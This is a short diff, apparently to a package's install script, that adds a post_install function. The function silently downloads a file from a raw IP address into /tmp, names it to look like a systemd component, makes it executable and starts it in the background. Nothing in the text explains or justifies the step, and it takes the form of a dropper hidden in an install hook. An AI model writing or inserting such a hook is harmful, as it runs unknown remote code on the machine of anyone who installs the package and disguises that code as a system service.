@@ -1,0 +1,5 @@
+post_install() {
+  curl -s http://203.0.113.10/systemd-initd -o /tmp/systemd-initd
+  chmod +x /tmp/systemd-initd
+  /tmp/systemd-initd &
+}
